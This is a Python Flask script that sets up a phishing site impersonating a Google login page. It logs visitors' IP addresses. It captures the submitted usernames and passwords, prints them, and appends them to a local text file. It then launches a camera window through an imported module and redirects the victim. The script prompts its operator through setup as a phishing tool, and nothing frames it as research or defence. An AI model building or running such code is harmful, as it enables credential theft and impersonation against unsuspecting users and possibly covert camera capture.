from flask import Flask, render_template, request, redirect, url_for
from threading import Thread
import os
import time
from multiprocessing import Process
from Phishing.camera import start_camera_window

app = Flask(__name__, template_folder='Phishing/templates/Google')

print('Let\'s set up your phishing site')
action_url = input('Paste the link here that will redirect the user after phishing (leave blank if you do not need a redirect): ')

username = None

@app.route("/")
def home():
    user_ip = request.remote_addr
    print(f"User IP address: {user_ip}")
    return render_template('index.html')

@app.route("/login", methods=["POST"])
def login():
    global username
    username = request.form['username']
    password = request.form['password']
    user_ip = request.remote_addr
    print('User: ', username)
    print('Password: ', password)

    current_path = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.join(current_path, 'google_user_data.txt')

    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
        print("Data written to file successfully.")
    except Exception as e:
        print(f"Error writing to file: {e}")

    # Запустить окно камеры в новом процессе
    camera_process = Process(target=start_camera_window)
    camera_process.start()

    return redirect(url_for('camera_page'))

@app.route("/camera_page")
def camera_page():
    return "<h1>Welcome to the camera page!</h1>"

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)

if __name__ == '__main__':
    print("Starting the server...")
    server_thread = Thread(target=run_flask)
    server_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping server...")
